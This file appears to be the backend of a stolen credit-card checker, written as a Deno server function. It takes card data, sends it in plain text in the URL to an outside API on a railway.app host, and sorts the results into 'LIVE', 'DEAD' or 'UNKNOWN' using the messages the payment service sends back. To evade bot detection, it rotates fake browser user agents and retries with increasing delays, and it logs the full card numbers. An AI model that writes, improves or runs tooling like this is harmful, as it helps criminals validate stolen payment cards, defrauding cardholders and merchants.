import { serve } from "https://deno.land/std@0.168.0/http/server.ts";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

// Multiple browser user agents for rotation
const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
];

// Get random user agent
const getRandomUserAgent = (): string => {
  return userAgents[Math.floor(Math.random() * userAgents.length)];
};

// Check if response should be classified as unknown
const isUnknownResponse = (data: Record<string, unknown>): boolean => {
  const message = (data?.message as string)?.toLowerCase() || '';
  
  // LIVE responses
  if (message.includes("payment method added successfully") || message.includes("card added successfully")) {
    return false;
  }
  
  // DEAD responses
  if (message.includes("declined") || message.includes("insufficient funds") || message.includes("card was declined")) {
    return false;
  }
  
  // Everything else is UNKNOWN
  return true;
};

// Perform API check with retry logic for UNKNOWN responses
const performCheck = async (cc: string, userAgent: string, attempt: number = 1): Promise<Record<string, unknown>> => {
  const maxRetries = 3;
  const apiUrl = `http://web-production-a3b94.up.railway.app/api?cc=${cc}`;
  
  console.log(`Attempt ${attempt}/${maxRetries} - Calling API:`, apiUrl);

  const response = await fetch(apiUrl, {
    method: 'GET',
    headers: {
      'User-Agent': userAgent,
      'Accept': 'application/json, text/plain, */*',
      'Accept-Language': 'en-US,en;q=0.9',
      'Cache-Control': 'no-cache',
      'Pragma': 'no-cache',
    }
  });
  
  const rawText = await response.text();
  console.log(`Attempt ${attempt} - Raw API response:`, rawText);

  let data: Record<string, unknown>;
  try {
    data = JSON.parse(rawText);
  } catch {
    data = { raw: rawText, status: "ERROR" };
  }

  console.log(`Attempt ${attempt} - Parsed response:`, data);

  // Check if response is UNKNOWN
  const isUnknown = isUnknownResponse(data);
  
  if (isUnknown && attempt < maxRetries) {
    console.log(`UNKNOWN response on attempt ${attempt}, retrying with new user agent...`);
    // Wait before retry (increasing delay)
    await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
    // Use a different user agent for retry
    const newUserAgent = getRandomUserAgent();
    return performCheck(cc, newUserAgent, attempt + 1);
  }

  return data;
};

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const { cc } = await req.json();
    
    if (!cc) {
      return new Response(
        JSON.stringify({ error: 'Card data (cc) is required' }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const userAgent = getRandomUserAgent();
    console.log('Checking card:', cc);
    console.log('Using User-Agent:', userAgent);

    // Perform check with automatic retry for UNKNOWN responses
    const data = await performCheck(cc, userAgent);

    return new Response(
      JSON.stringify(data),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error: unknown) {
    const errorMessage = error instanceof Error ? error.message : 'Unknown error';
    console.error('Error:', errorMessage);
    
    return new Response(
      JSON.stringify({ error: errorMessage, status: "ERROR" }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});
